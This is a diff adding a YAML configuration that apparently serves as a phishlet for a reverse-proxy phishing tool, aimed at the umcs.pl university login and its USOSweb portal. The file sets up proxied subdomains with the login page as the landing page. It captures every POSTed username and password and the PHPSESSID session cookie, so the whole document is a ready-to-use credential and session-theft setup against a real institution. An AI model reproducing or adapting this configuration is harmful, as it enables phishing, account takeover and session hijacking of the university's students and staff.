@@ -1,0 +1,50 @@
+name: "UMCS 2024"
+author: "syrex1013"
+min_ver: "3.0.0"
+
+proxy_hosts:
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "umcs.pl",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "umcs.pl",
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "umcs.pl",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+
+auth_tokens:
+  - domain: "usosweb.umcs.pl"
+    keys: ["PHPSESSID"]
+    type: "cookie"
+
+auth_urls:
+  - "/login"
+
+credentials:
+  username:
+    key: "username"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+
+login:
+  domain: "login.umcs.pl"
+  path: "login?service=https%3A%2F%2Fusosweb.umcs.pl%2Fkontroler.php%3F_action%3Dlogowaniecas%2Findex&locale=pl"
